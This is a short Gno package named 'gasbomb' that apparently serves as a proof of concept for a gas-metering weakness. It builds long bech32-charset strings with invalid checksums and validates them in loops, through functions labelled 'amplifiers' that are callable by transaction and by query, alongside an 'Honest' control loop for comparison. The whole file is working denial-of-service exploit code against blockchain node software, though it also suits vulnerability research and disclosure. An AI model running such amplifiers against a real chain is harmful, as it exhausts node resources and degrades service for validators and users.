package gasbomb

// build returns "g1" followed by 'q' characters up to `size` bytes total:
// valid bech32 charset, guaranteed-invalid checksum, so AddressFromBech32
// walks the ENTIRE string (multiple O(L) passes) before failing.
func build(size int) string {
	s := "g1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqq" // 32 bytes
	for len(s) < size {
		if len(s)*2 <= size {
			s = s + s
		} else {
			s = s + s[:size-len(s)]
		}
	}
	return s
}

// Bomb is the crossing (MsgCall-able) amplifier.
func Bomb(cur realm, size int, iters int) int {
	s := build(size)
	n := 0
	for i := 0; i < iters; i++ {
		a := address(s)
		if a.IsValid() {
			panic("string unexpectedly valid")
		}
		n++
	}
	return n
}

// BombQ is the non-crossing (qeval-able) amplifier.
func BombQ(size int, iters int) int {
	s := build(size)
	n := 0
	for i := 0; i < iters; i++ {
		a := address(s)
		if a.IsValid() {
			panic("string unexpectedly valid")
		}
		n++
	}
	return n
}

// Honest is the control: identical loop shape burning pure-Gno compute.
func Honest(cur realm, iters int) int {
	n := 0
	x := 1
	for i := 0; i < iters; i++ {
		x = (x*1103515245 + 12345) % 2147483647
		n++
	}
	return n
}
